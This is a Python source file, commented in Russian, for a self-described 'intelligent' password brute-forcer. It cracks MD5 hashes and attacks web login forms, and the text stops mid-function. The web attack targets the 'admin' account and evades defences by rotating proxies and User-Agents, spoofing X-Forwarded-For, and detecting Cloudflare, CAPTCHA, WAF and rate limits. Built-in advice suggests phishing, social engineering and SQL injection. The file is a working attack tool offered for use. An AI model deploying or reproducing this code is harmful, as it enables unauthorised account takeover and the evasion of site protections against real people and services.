import asyncio
import concurrent.futures
import hashlib
import time
import re
import json
from multiprocessing import Pool, cpu_count, Manager
from typing import List, Optional, Tuple, Dict, Any, Set
import aiohttp
from aiohttp_socks import ProxyConnector
import uvloop
import logging
from fake_useragent import UserAgent
import random
import numpy as np
from dataclasses import dataclass
from enum import Enum
from datetime import datetime
import pickle
from pathlib import Path
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
import itertools

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bruteforcer.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Устанавливаем быстрый event loop
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

class AttackType(Enum):
    HASH = "hash"
    WEB = "web"
    SSH = "ssh"
    API = "api"

@dataclass
class AttackResult:
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    time_taken: float = 0.0
    strategy_used: str = "direct"

class ProtectionLevel(Enum):
    NONE = 0
    WEAK = 1
    MEDIUM = 2
    STRONG = 3
    VERY_STRONG = 4

# Глобальные функции для multiprocessing
def process_chunk_global(chunk, common_prefixes, common_suffixes):
    """Глобальная функция для обработки чанка паролей"""
    local_enhanced = set()
    for word in chunk:
        # Оригинальное слово
        local_enhanced.add(word)
        
        # Добавляем суффиксы
        for suffix in common_suffixes:
            local_enhanced.add(word + suffix)
            local_enhanced.add(word + '_' + suffix)
        
        # Добавляем префиксы
        for prefix in common_prefixes:
            local_enhanced.add(prefix + word)
            local_enhanced.add(prefix + '_' + word)
        
        # Применяем трансформации
        transformations = [
            lambda x: x.upper(),
            lambda x: x.capitalize(),
            lambda x: x.lower(),
            lambda x: x + x,
            lambda x: x[::-1],
            lambda x: x.replace('a', '@').replace('e', '3').replace('i', '1'),
        ]
        
        for transform in transformations:
            try:
                transformed = transform(word)
                if transformed:
                    local_enhanced.add(transformed)
            except:
                continue
    
    return local_enhanced

def hash_chunk_global(chunk, target_hash):
    """Глобальная функция для проверки хешей в чанке"""
    for password in chunk:
        if hashlib.md5(password.encode()).hexdigest() == target_hash:
            return password
    return None

class TimeEstimator:
    """Интеллектуальная оценка времени взлома и рекомендации"""
    
    def __init__(self):
        # Бенчмарки производительности (операций/секунду)
        self.benchmarks = {
            'hash_md5': {
                'cpu': 5_000_000,    # 5M хешей/сек на CPU
                'gpu': 10_000_000_000  # 10B хешей/сек на GPU
            },
            'web_request': {
                'direct': 10,        # 10 запросов/сек напрямую
                'proxy': 5,          # 5 запросов/сек через прокси
                'stealth': 2         # 2 запроса/сек в stealth режиме
            },
            'ssh_brute': {
                'default': 50        # 50 попыток/сек
            }
        }
        
        # Словари для оценки сложности
        self.password_complexity = {
            'very_weak': 10**4,      # 10^4 комбинаций
            'weak': 10**6,           # 10^6 комбинаций  
            'medium': 10**8,         # 10^8 комбинаций
            'strong': 10**10,        # 10^10 комбинаций
            'very_strong': 10**12    # 10^12 комбинаций
        }
    
    def estimate_hash_time(self, target_hash: str, wordlist_size: int, 
                          hardware: str = 'cpu') -> Dict[str, Any]:
        """Оценка времени для hash-атаки"""
        speed = self.benchmarks['hash_md5'][hardware]
        total_operations = wordlist_size
        
        time_seconds = total_operations / speed
        time_human = self._format_time(time_seconds)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'operations_per_sec': speed,
            'total_operations': total_operations,
            'hardware_used': hardware
        }
    
    def estimate_web_time(self, target_url: str, wordlist_size: int,
                         protection_level: ProtectionLevel) -> Dict[str, Any]:
        """Оценка времени для web-атаки"""
        # Определяем скорость based on уровня защиты
        speed_map = {
            ProtectionLevel.NONE: self.benchmarks['web_request']['direct'],
            ProtectionLevel.WEAK: self.benchmarks['web_request']['direct'] * 0.5,
            ProtectionLevel.MEDIUM: self.benchmarks['web_request']['proxy'],
            ProtectionLevel.STRONG: self.benchmarks['web_request']['proxy'] * 0.3,
            ProtectionLevel.VERY_STRONG: self.benchmarks['web_request']['stealth']
        }
        
        speed = speed_map[protection_level]
        total_operations = wordlist_size
        time_seconds = total_operations / speed
        time_human = self._format_time(time_seconds)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'requests_per_sec': speed,
            'total_requests': total_operations,
            'protection_level': protection_level.name
        }
    
    def estimate_brute_force_time(self, charset: str, max_length: int,
                                 hardware: str = 'cpu') -> Dict[str, Any]:
        """Оценка времени для brute force атаки"""
        total_combinations = 0
        for length in range(1, max_length + 1):
            total_combinations += len(charset) ** length
        
        speed = self.benchmarks['hash_md5'][hardware]
        time_seconds = total_combinations / speed
        time_human = self._format_time(time_seconds)
        
        complexity = self._get_complexity_level(total_combinations)
        
        return {
            'estimated_time': time_seconds,
            'formatted_time': time_human,
            'total_combinations': total_combinations,
            'complexity_level': complexity,
            'feasible': time_seconds < 2592000  # 30 дней
        }
    
    def get_recommendations(self, attack_type: str, estimated_time: float,
                           wordlist_size: int, context: Dict) -> List[str]:
        """Получение рекомендаций based on оценки времени"""
        recommendations = []
        
        if estimated_time > 2592000:  # > 30 дней
            recommendations.append("❌ Взлом практически невозможен за разумное время")
            recommendations.extend(self._get_alternative_approaches(attack_type, context))
        
        elif estimated_time > 86400:  # > 1 день
            recommendations.append("⚠️ Длительный процесс - рассмотрите альтернативы")
            recommendations.extend(self._get_optimization_tips(attack_type, context))
        
        elif estimated_time > 3600:  # > 1 час
            recommendations.append("⏳ Займет несколько часов - можно оптимизировать")
            recommendations.extend(self._get_optimization_tips(attack_type, context))
        
        else:
            recommendations.append("✅ Взлом feasible - можно начинать")
        
        # Добавляем аппаратные рекомендации
        if attack_type == 'hash':
            recommendations.extend(self._get_hardware_recommendations(context))
        
        return recommendations
    
    def _get_alternative_approaches(self, attack_type: str, context: Dict) -> List[str]:
        """Рекомендации альтернативных подходов"""
        alternatives = []
        
        if attack_type == 'hash':
            alternatives.extend([
                "🔧 Используйте Hashcat с GPU ускорением",
                "🔧 Попробуйте радужные таблицы",
                "🔧 Ищите утечки паролей в интернете",
                "🔧 Попробуйте социальную инженерию"
            ])
        
        elif attack_type == 'web':
            alternatives.extend([
                "🔧 Попробуйте SQL инъекции вместо брутфорса",
                "🔧 Ищите уязвимости в веб-приложении",
                "🔧 Проверьте стандартные пароли админа",
                "🔧 Используйте фишинг для получения пароля"
            ])
        
        return alternatives
    
    def _get_optimization_tips(self, attack_type: str, context: Dict) -> List[str]:
        """Советы по оптимизации"""
        tips = []
        
        if attack_type == 'hash':
            tips.extend([
                "⚡ Используйте правила Hashcat для улучшения словаря",
                "⚡ Добавьте маски и паттерны паролей",
                "⚡ Используйте распределенные вычисления",
                "⚡ Оптимизируйте словарь (уберите дубликаты)"
            ])
        
        elif attack_type == 'web':
            tips.extend([
                "⚡ Увеличьте количество потоков",
                "⚡ Используйте больше прокси для обхода блокировок",
                "⚡ Настройте умные задержки между запросами",
                "⚡ Используйте ротацию User-Agent"
            ])
        
        return tips
    
    def _get_hardware_recommendations(self, context: Dict) -> List[str]:
        """Рекомендации по аппаратному обеспечению"""
        recommendations = []
        
        if context.get('estimated_time_cpu', 0) > 3600:
            recommendations.extend([
                "💻 Для ускорения используйте GPU (NVIDIA RTX 4090)",
                "💻 Рассмотрите облачные GPU сервисы (AWS, GCP)",
                "💻 Используйте распределенные вычисления"
            ])
        
        return recommendations
    
    def _format_time(self, seconds: float) -> str:
        """Форматирование времени в читаемый вид"""
        if seconds < 60:
            return f"{seconds:.1f} секунд"
        elif seconds < 3600:
            return f"{seconds/60:.1f} минут"
        elif seconds < 86400:
            return f"{seconds/3600:.1f} часов"
        elif seconds < 2592000:
            return f"{seconds/86400:.1f} дней"
        else:
            return f"{seconds/2592000:.1f} месяцев"
    
    def _get_complexity_level(self, combinations: int) -> str:
        """Определение уровня сложности пароля"""
        if combinations < self.password_complexity['very_weak']:
            return "very_weak"
        elif combinations < self.password_complexity['weak']:
            return "weak"
        elif combinations < self.password_complexity['medium']:
            return "medium"
        elif combinations < self.password_complexity['strong']:
            return "strong"
        else:
            return "very_strong"

class IntelligentAdvisor:
    """Интеллектуальный советник по выбору инструментов"""
    
    def __init__(self):
        self.tools_db = {
            'hashcat': {
                'type': 'hash',
                'speed': 'very_high',
                'hardware': 'gpu',
                'best_for': ['md5', 'sha1', 'ntlm', 'wpa'],
                'complexity': ['medium', 'strong', 'very_strong']
            },
            'john': {
                'type': 'hash',
                'speed': 'high', 
                'hardware': 'cpu',
                'best_for': ['zip', 'pdf', 'ssh', 'rar'],
                'complexity': ['weak', 'medium']
            },
            'hydra': {
                'type': 'network',
                'speed': 'medium',
                'hardware': 'cpu',
                'best_for': ['http', 'ftp', 'ssh', 'smb'],
                'complexity': ['very_weak', 'weak']
            },
            'medusa': {
                'type': 'network', 
                'speed': 'medium',
                'hardware': 'cpu',
                'best_for': ['web', 'database', 'ssh'],
                'complexity': ['very_weak', 'weak']
            }
        }
    
    def recommend_tools(self, attack_type: str, complexity: str, 
                       estimated_time: float) -> List[Dict]:
        """Рекомендация инструментов based on параметров"""
        recommended = []
        
        for tool_name, tool_info in self.tools_db.items():
            if (tool_info['type'] == attack_type and 
                complexity in tool_info['complexity']):
                
                # Добавляем рейтинг эффективности
                effectiveness = self._calculate_effectiveness(
                    tool_info, complexity, estimated_time
                )
                
                recommended.append({
                    'name': tool_name,
                    'effectiveness': effectiveness,
                    'reason': f"Оптимален для {complexity} сложности",
                    'speed': tool_info['speed']
                })
        
        # Сортируем по эффективности
        recommended.sort(key=lambda x: x['effectiveness'], reverse=True)
        return recommended
    
    def _calculate_effectiveness(self, tool_info: Dict, complexity: str, 
                               estimated_time: float) -> float:
        """Расчет эффективности инструмента"""
        effectiveness = 0.0
        
        # Базовые веса
        speed_weights = {'very_high': 1.0, 'high': 0.8, 'medium': 0.6, 'low': 0.4}
        complexity_weights = {'very_weak': 0.2, 'weak': 0.4, 'medium': 0.6, 'strong': 0.8, 'very_strong': 1.0}
        
        effectiveness += speed_weights.get(tool_info['speed'], 0.5)
        effectiveness += complexity_weights.get(complexity, 0.5)
        
        # Корректировка based on времени
        if estimated_time > 86400:  # > 1 дня
            effectiveness *= 1.5 if tool_info['speed'] == 'very_high' else 0.8
        
        return round(effectiveness, 2)

class CPUAccelerator:
    """Ускоритель вычислений на CPU с многопроцессорностью"""
    
    def __init__(self, max_workers: int = None):
        self.max_workers = max_workers or (cpu_count() - 1 or 1)
        logger.info(f"CPU Accelerator initialized with {self.max_workers} workers")
    
    def parallel_hash_check(self, target_hash: str, password_chunks: List[List[str]]) -> Optional[str]:
        """Параллельная проверка хешей с использованием глобальной функции"""
        with ProcessPoolExecutor(max_workers=self.max_workers) as executor:
            # Используем starmap для передачи нескольких аргументов
            futures = [
                executor.submit(hash_chunk_global, chunk, target_hash)
                for chunk in password_chunks
            ]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    # Останавливаем другие процессы если нашли пароль
                    for f in futures:
                        f.cancel()
                    return result
        
        return None

class VectorizedHasher:
    """Векторизованные вычисления хешей с NumPy"""
    
    def __init__(self):
        self.hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256
        }
    
    def vectorized_hash_batch(self, passwords: List[str], hash_type: str = "md5") -> np.ndarray:
        """Векторизованное вычисление хешей для батча"""
        hash_func = self.hash_functions.get(hash_type, hashlib.md5)
        results = []
        
        for password in passwords:
            results.append(hash_func(password.encode()).hexdigest())
        
        return np.array(results)
    
    def find_hash_match_vectorized(self, target_hash: str, hashes: np.ndarray, passwords: np.ndarray) -> Optional[str]:
        """Векторизованный поиск совпадения"""
        matches = np.where(hashes == target_hash)[0]
        if len(matches) > 0:
            return passwords[matches[0]]
        return None

class RateLimiter:
    """Ограничитель скорости запросов"""
    def __init__(self, max_requests_per_second: float = 50.0):
        self.max_requests = max_requests_per_second
        self.timestamps = []
        self.min_interval = 1.0 / max_requests_per_second
    
    async def acquire(self):
        now = time.time()
        self.timestamps = [ts for ts in self.timestamps if now - ts < 1.0]
        
        if len(self.timestamps) >= self.max_requests:
            sleep_time = 1.0 - (now - self.timestamps[0])
            if sleep_time > 0:
                await asyncio.sleep(sleep_time)
            now = time.time()
            self.timestamps = [ts for ts in self.timestamps if now - ts < 1.0]
        
        self.timestamps.append(now)

class FastPatternMatcher:
    """Быстрый анализатор паттернов защиты"""
    
    def __init__(self):
        self.protection_patterns = {
            'cloudflare': [r'cloudflare', r'cf-ray', r'__cfduid'],
            'captcha': [r'captcha', r'recaptcha', r'hcaptcha'],
            'waf': [r'waf', r'security', r'firewall', r'forbidden'],
            'rate_limit': [r'rate.*limit', r'too.*many', r'429'],
            'block': [r'block', r'banned', r'ip.*block'],
        }
        
        self.evasion_strategies = {
            'cloudflare': {'delay': 2.0, 'proxy_rotate': True, 'user_agent_rotate': True},
            'captcha': {'delay': 5.0, 'proxy_rotate': True, 'change_strategy': True},
            'waf': {'delay': 3.0, 'proxy_rotate': True, 'headers_rotate': True},
            'rate_limit': {'delay': 10.0, 'proxy_rotate': True, 'reduce_concurrency': True},
            'block': {'delay': 15.0, 'proxy_rotate': True, 'change_ip': True},
        }
    
    def analyze_response(self, text: str, status_code: int) -> Optional[Dict]:
        """Быстрый анализ ответа на признаки защиты"""
        if status_code == 429:
            return self.evasion_strategies['rate_limit']
        
        if status_code >= 400:
            text_lower = text.lower()
            for pattern_name, patterns in self.protection_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, text_lower, re.IGNORECASE):
                        return self.evasion_strategies[pattern_name]
        
        return None

class RuleEngine:
    """Генератор умных правил для паролей"""
    
    def __init__(self):
        self.common_suffixes = [
            '123', '!', '@', '#', '$', '%', '^', '&', '*', '()',
            '2023', '2024', '2025', '01', '02', '1', '2', '00'
        ]
        
        self.common_prefixes = [
            'admin', 'root', 'user', 'test', 'temp', 'super'
        ]
        
    def enhance_wordlist(self, base_words: List[str]) -> List[str]:
        """Улучшение словаря с помощью правил"""
        enhanced = set()
        
        for word in base_words:
            enhanced.add(word)
            
            for suffix in self.common_suffixes:
                enhanced.add(word + suffix)
                enhanced.add(word + '_' + suffix)
            
            for prefix in self.common_prefixes:
                enhanced.add(prefix + word)
                enhanced.add(prefix + '_' + word)
            
            # Применяем трансформации
            transformations = [
                lambda x: x.upper(),
                lambda x: x.capitalize(),
                lambda x: x.lower(),
                lambda x: x + x,
                lambda x: x[::-1],
                lambda x: x.replace('a', '@').replace('e', '3').replace('i', '1'),
            ]
            
            for transform in transformations:
                try:
                    transformed = transform(word)
                    if transformed:
                        enhanced.add(transformed)
                except:
                    continue
        
        return list(enhanced)
    
    def parallel_enhance(self, base_words: List[str], chunk_size: int = 1000) -> List[str]:
        """Параллельное улучшение словаря с использованием глобальной функции"""
        enhanced = set(base_words)
        
        # Разбиваем на чанки для параллельной обработки
        chunks = [base_words[i:i + chunk_size] for i in range(0, len(base_words), chunk_size)]
        
        with ProcessPoolExecutor() as executor:
            # Используем глобальную функцию вместо метода класса
            futures = [
                executor.submit(
                    process_chunk_global, 
                    chunk, 
                    self.common_prefixes, 
                    self.common_suffixes
                )
                for chunk in chunks
            ]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    enhanced.update(future.result())
                except Exception as e:
                    logger.error(f"Error processing chunk: {e}")
        
        return list(enhanced)

class ProxyManager:
    """Умный менеджер прокси с автоматической проверкой"""
    
    def __init__(self):
        self.proxies = []
        self.good_proxies = []
        self.bad_proxies = set()
        self.proxy_stats = {}
        self.rotation_count = 0
    
    def load_proxies(self, proxy_file: str = None, proxy_list: List[str] = None):
        """Загрузка прокси из файла или списка"""
        if proxy_file and Path(proxy_file).exists():
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        elif proxy_list:
            self.proxies = proxy_list
        
        self.good_proxies = self.proxies.copy()
        logger.info(f"Loaded {len(self.proxies)} proxies")
    
    async def verify_proxy(self, proxy: str) -> bool:
        """Проверка работоспособности прокси"""
        try:
            connector = ProxyConnector.from_url(proxy)
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                test_urls = [
                    'http://httpbin.org/ip',
                    'http://api.ipify.org',
                    'http://icanhazip.com'
                ]
                
                for url in test_urls:
                    try:
                        async with session.get(url, timeout=10) as response:
                            if response.status == 200:
                                return True
                    except:
                        continue
        except:
            pass
        return False
    
    async def verify_all_proxies(self):
        """Проверка всех прокси"""
        logger.info("Verifying proxies...")
        tasks = [self.verify_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        self.good_proxies = [
            proxy for proxy, working in zip(self.proxies, results) 
            if working is True
        ]
        
        logger.info(f"Verified: {len(self.good_proxies)} good, {len(self.proxies) - len(self.good_proxies)} bad proxies")
    
    def get_proxy(self) -> Optional[str]:
        """Получение случайного рабочего прокси"""
        if not self.good_proxies:
            return None
        
        self.rotation_count += 1
        if self.rotation_count % 10 == 0:
            random.shuffle(self.good_proxies)
        
        return random.choice(self.good_proxies)
    
    def mark_bad_proxy(self, proxy: str):
        """Пометить прокси как плохой"""
        if proxy in self.good_proxies:
            self.good_proxies.remove(proxy)
        self.bad_proxies.add(proxy)
        logger.warning(f"Marked proxy as bad: {proxy}")

class AdaptiveStrategyManager:
    """Менеджер адаптивных стратегий атаки"""
    
    def __init__(self):
        self.current_strategy = "direct"
        self.strategy_history = []
        self.failures = 0
        self.success_rate = 0.0
        self.last_adaptation = time.time()
    
    def detect_protection_level(self, responses: List[Dict]) -> ProtectionLevel:
        """Определение уровня защиты на основе ответов"""
        error_count = sum(1 for r in responses if r.get('status', 200) >= 400)
        success_rate = 1 - (error_count / max(len(responses), 1))
        
        if success_rate > 0.8:
            return ProtectionLevel.NONE
        elif success_rate > 0.5:
            return ProtectionLevel.WEAK
        elif success_rate > 0.2:
            return ProtectionLevel.MEDIUM
        elif success_rate > 0.05:
            return ProtectionLevel.STRONG
        else:
            return ProtectionLevel.VERY_STRONG
    
    def adapt_strategy(self, protection_level: ProtectionLevel) -> Dict:
        """Адаптация стратегии based on уровня защиты"""
        strategies = {
            ProtectionLevel.NONE: {
                'delay': 0.01,
                'concurrency': 100,
                'proxy_rotate': False,
                'user_agent_rotate': False
            },
            ProtectionLevel.WEAK: {
                'delay': 0.1,
                'concurrency': 50,
                'proxy_rotate': True,
                'user_agent_rotate': True
            },
            ProtectionLevel.MEDIUM: {
                'delay': 0.5,
                'concurrency': 20,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True
            },
            ProtectionLevel.STRONG: {
                'delay': 2.0,
                'concurrency': 10,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True,
                'change_patterns': True
            },
            ProtectionLevel.VERY_STRONG: {
                'delay': 5.0,
                'concurrency': 5,
                'proxy_rotate': True,
                'user_agent_rotate': True,
                'random_delay': True,
                'change_patterns': True,
                'deep_analysis': True
            }
        }
        
        return strategies[protection_level]

class UltimateBruteForcer:
    """Интеллектуальный гибридный брутфорсер с CPU-ускорением"""
    
    def __init__(self, target: str, wordlist: List[str], attack_type: AttackType = AttackType.HASH):
        self.target = target
        self.original_wordlist = wordlist
        self.attack_type = attack_type
        self.wordlist = []
        self.found = False
        self.result = None
        
        # Компоненты системы
        self.proxy_manager = ProxyManager()
        self.rule_engine = RuleEngine()
        self.pattern_matcher = FastPatternMatcher()
        self.strategy_manager = AdaptiveStrategyManager()
        self.ua = UserAgent()
        self.rate_limiter = RateLimiter(max_requests_per_second=50.0)
        self.cpu_accelerator = CPUAccelerator()
        self.vector_hasher = VectorizedHasher()
        self.time_estimator = TimeEstimator()
        self.advisor = IntelligentAdvisor()
        
        # Статистика
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'errors': 0,
            'start_time': time.time(),
            'proxy_rotations': 0,
            'current_index': 0
        }
        
        # Текущая стратегия
        self.current_strategy = {
            'delay': 0.1,
            'concurrency': 50,
            'proxy_rotate': True,
            'user_agent_rotate': True,
            'use_cpu_acceleration': True,
            'batch_size': 1000
        }
    
    def enhance_wordlist(self):
        """Улучшение словаря с помощью правил"""
        logger.info("Enhancing wordlist with rules...")
        
        if len(self.original_wordlist) > 5000:
            # Для больших словарей используем параллельную обработку
            self.wordlist = self.rule_engine.parallel_enhance(self.original_wordlist)
        else:
            self.wordlist = self.rule_engine.enhance_wordlist(self.original_wordlist)
        
        logger.info(f"Enhanced wordlist size: {len(self.wordlist)}")
    
    async def setup_proxies(self, proxy_file: str = None, proxy_list: List[str] = None):
        """Настройка прокси с проверкой"""
        self.proxy_manager.load_proxies(proxy_file, proxy_list)
        await self.proxy_manager.verify_all_proxies()
    
    async def try_password_hash(self, password: str) -> bool:
        """Проверка пароля для хеша"""
        password_hash = hashlib.md5(password.encode()).hexdigest()
        self.stats['attempts'] += 1
        return password_hash == self.target
    
    async def batch_hash_attack(self) -> Optional[str]:
        """Пакетная атака на хеш с CPU-ускорением"""
        logger.info("Starting batch hash attack with CPU acceleration...")
        
        batch_size = self.current_strategy.get('batch_size', 1000)
        chunks = [self.wordlist[i:i + batch_size] for i in range(0, len(self.wordlist), batch_size)]
        
        for i, chunk in enumerate(chunks):
            if self.found:
                break
            
            logger.info(f"Processing batch {i+1}/{len(chunks)} ({len(chunk)} passwords)")
            
            # Используем CPU-ускорение для пакетной обработки
            result = self.cpu_accelerator.parallel_hash_check(self.target, [chunk])
            
            if result:
                self.found = True
                return result
            
            # Небольшая задержка между батчами
            await asyncio.sleep(0.01)
        
        return None
    
    async def vectorized_hash_attack(self) -> Optional[str]:
        """Векторизованная атака на хеш"""
        logger.info("Starting vectorized hash attack...")
        
        batch_size = 5000
        passwords_array = np.array(self.wordlist)
        
        for i in range(0, len(passwords_array), batch_size):
            if self.found:
                break
            
            batch = passwords_array[i:i + batch_size]
            logger.info(f"Processing vectorized batch {i//batch_size + 1}/{(len(passwords_array)-1)//batch_size + 1}")
            
            # Векторизованное вычисление хешей
            hashes = self.vector_hasher.vectorized_hash_batch(batch.tolist(), "md5")
            
            # Векторизованный поиск совпадений
            result = self.vector_hasher.find_hash_match_vectorized(self.target, hashes, batch)
            
            if result:
                self.found = True
                return result
            
            self.stats['attempts'] += len(batch)
            await asyncio.sleep(0.001)
        
        return None
    
    async def try_password_web(self, password: str, session: aiohttp.ClientSession) -> Dict:
        """Проверка пароля для веб-формы"""
        try:
            data = {
                'username': 'admin',
                'password': password,
                'csrf': 'dummy_token'
            }
            
            headers = {
                'User-Agent': self.ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            async with session.post(self.target, data=data, headers=headers, timeout=30) as response:
                text = await response.text()
                success = response.status == 200 and 'invalid' not in text.lower()
                
                result = {
                    'success': success,
                    'status': response.status,
                    'text': text[:200],
                    'password': password
                }
                
                protection = self.pattern_matcher.analyze_response(text, response.status)
                if protection:
                    self.adapt_to_protection(protection)
                
                return result
                
        except aiohttp.ClientError as e:
            logger.warning(f"Network error for {password}: {e}")
            return {'success': False, 'error': 'network_error'}
        except Exception as e:
            logger.error(f"Unexpected error for {password}: {e}")
            return {'success': False, 'error': 'unexpected_error'}
    
    def adapt_to_protection(self, protection_strategy: Dict):
        """Адаптация к обнаруженной защите"""
        logger.warning(f"Adapting to protection: {protection_strategy}")
        self.current_strategy.update(protection_strategy)
    
    async def hash_attack(self) -> Optional[str]:
        """Атака на хеш с выбором стратегии"""
        if self.current_strategy.get('use_cpu_acceleration', True):
            if len(self.wordlist) > 10000:
                # Для больших словарей используем векторизованный подход
                return await self.vectorized_hash_attack()
            else:
                # Для средних словарей используем пакетную обработку
                return await self.batch_hash_attack()
        else:
            # Стандартный последовательный подход
            logger.info("Starting sequential hash attack...")
            for password in self.wordlist:
                if self.found:
                    break
                    
                if await self.try_password_hash(password):
                    self.found = True
                    return password
                
                await asyncio.sleep(self.current_strategy['delay'])
            
            return None
    
    async def web_attack(self) -> Optional[str]:
        """Атака на веб-форму"""
        logger.info("Starting web attack...")
        
        for i, password in enumerate(self.wordlist[self.stats['current_index']:], start=self.stats['current_index']):
            if self.found:
                break
            
            await self.rate_limiter.acquire()
            
            proxy = self.proxy_manager.get_proxy() if self.current_strategy['proxy_rotate'] else None
            connector = ProxyConnector.from_url(proxy) if proxy else None
            
            try:
                async with aiohttp.ClientSession(connector=connector) as session:
                    result = await self.try_password_web(password, session)
                    
                    self.stats['attempts'] += 1
                    self.stats['current_index'] = i + 1
                    
                    if result.get('success'):
                        self.found = True
                        logger.info(f"✅ Password found: {password}")
                        return password
                    
                    if self.stats['attempts'] % 100 == 0:
                        logger.info(f"Attempts: {self.stats['attempts']}, Last password: {password}")
                    
                    if self.stats['attempts'] % 500 == 0:
                        self.save_progress()
                
            except Exception as e:
                logger.error(f"Error processing {password}: {e}")
            
            delay = self.current_strategy['delay']
            if self.current_strategy.get('random_delay'):
                delay *= random.uniform(0.5, 1.5)
            
            await asyncio.sleep(delay)
            
            if self.stats['attempts'] % 100 == 0:
                self.adapt_based_on_stats()
        
        return None
    
    def adapt_based_on_stats(self):
        """Адаптация стратегии based on статистики"""
        success_rate = self.stats['successes'] / max(self.stats['attempts'], 1)
        
        if success_rate < 0.1:
            self.current_strategy['delay'] *= 1.5
            self.current_strategy['concurrency'] = max(5, self.current_strategy['concurrency'] - 5)
            logger.info("Reducing speed due to low success rate")
    
    def save_progress(self, filename: str = "progress.pkl"):
        """Сохранение прогресса атаки"""
        progress = {
            'attempts': self.stats['attempts'],
            'current_index': self.stats.get('current_index', 0),
            'found': self.found,
            'bad_proxies': list(self.proxy_manager.bad_proxies),
            'timestamp': time.time()
        }
        
        with open(filename, 'wb') as f:
            pickle.dump(progress, f)
        
        logger.info(f"Progress saved: attempts={progress['attempts']}, index={progress['current_index']}")
    
    def load_progress(self, filename: str = "progress.pkl"):
        """Загрузка прогресса атаки"""
        if Path(filename).exists():
            try:
                with open(filename, 'rb') as f:
                    progress = pickle.load(f)
                    self.stats['attempts'] = progress['attempts']
                    self.stats['current_index'] = progress['current_index']
                    self.found = progress['found']
                    self.proxy_manager.bad_proxies = set(progress['bad_proxies'])
                logger.info(f"Progress loaded: attempts={progress['attempts']}, index={progress['current_index']}")
            except Exception as e:
                logger.error(f"Failed to load progress: {e}")
    
    async def analyze_attack_feasibility(self) -> Dict[str, Any]:
        """Анализ целесообразности атаки"""
        analysis = {}
        
        if self.attack_type == AttackType.HASH:
            # Оценка для hash-атаки
            estimation = self.time_estimator.estimate_hash_time(
                self.target, len(self.wordlist), 'cpu'
            )
            
            analysis.update(estimation)
            analysis['recommendations'] = self.time_estimator.get_recommendations(
                'hash', estimation['estimated_time'], len(self.wordlist), estimation
            )
            
            # Рекомендации инструментов
            complexity = self.time_estimator._get_complexity_level(len(self.wordlist))
            analysis['recommended_tools'] = self.advisor.recommend_tools(
                'hash', complexity, estimation['estimated_time']
            )
        
        elif self.attack_type == AttackType.WEB:
            # Оценка для web-атаки (предполагаем средний уровень защиты)
            estimation = self.time_estimator.estimate_web_time(
                self.target, len(self.wordlist), ProtectionLevel.MEDIUM
            )
            
            analysis.update(estimation)
            analysis['recommendations'] = self.time_estimator.get_recommendations(
                'web', estimation['estimated_time'], len(self.wordlist), estimation
            )
        
        return analysis
    
    async def print_attack_analysis(self):
        """Красивый вывод анализа атаки"""
        analysis = await self.analyze_attack_feasibility()
        
        print(f"\n{'='*60}")
        print("🎯 АНАЛИЗ ЦЕЛЕСООБРАЗНОСТИ АТАКИ")
        print(f"{'='*60}")
        
        print(f"📊 Объем работы: {analysis.get('total_operations', 0):,} операций")
        print(f"⏱️ Оценочное время: {analysis.get('formatted_time', 'N/A')}")
        
        if 'operations_per_sec' in analysis:
            print(f"⚡ Скорость: {analysis['operations_per_sec']:,.0f} оп/сек")
        elif 'requests_per_sec' in analysis:
            print(f"⚡ Скорость: {analysis['requests_per_sec']:,.1f} запросов/сек")
        
        print(f"\n💡 РЕКОМЕНДАЦИИ:")
        for rec in analysis.get('recommendations', []):
            print(f"   {rec}")
        
        if 'recommended_tools' in analysis:
            print(f"\n🛠️ РЕКОМЕНДУЕМЫЕ ИНСТРУМЕНТЫ:")
            for tool in analysis['recommended_tools'][:3]:  # Топ-3 инструмента
                print(f"   {tool['name']} (эффективность: {tool['effectiveness']}/1.0) - {tool['reason']}")
        
        print(f"{'='*60}")
        
        return analysis
    
    async def run_attack(self) -> AttackResult:
        """Запуск интеллектуальной атаки"""
        logger.info(f"🚀 Starting {self.attack_type.value} attack with CPU acceleration")
        logger.info(f"📊 Wordlist: {len(self.wordlist)} passwords")
        logger.info(f"🌐 Proxies: {len(self.proxy_manager.good_proxies)} available")
        logger.info(f"⚡ Strategy: {self.current_strategy}")
        logger.info(f"🔢 CPU Workers: {self.cpu_accelerator.max_workers}")
        
        # Сначала показываем анализ
        print("\n" + "="*60)
        print("🔍 ПРЕДВАРИТЕЛЬНЫЙ АНАЛИЗ АТАКИ")
        print("="*60)
        analysis = await self.print_attack_analysis()
        
        # Запрашиваем подтверждение если время большое
        if analysis.get('estimated_time', 0) > 3600:  # больше 1 часа
            response = input("\n🚀 Продолжить атаку? (y/n): ")
            if response.lower() != 'y':
                print("Атака отменена пользователем.")
                return AttackResult(success=False, attempts=0, time_taken=0.0)
        
        start_time = time.time()
        
        try:
            if self.attack_type == AttackType.HASH:
                result = await self.hash_attack()
            elif self.attack_type == AttackType.WEB:
                self.load_progress()
                result = await self.web_attack()
            else:
                raise ValueError(f"Unsupported attack type: {self.attack_type}")
            
            end_time = time.time()
            
            return AttackResult(
                success=result is not None,
                password=result,
                attempts=self.stats['attempts'],
                time_taken=end_time - start_time,
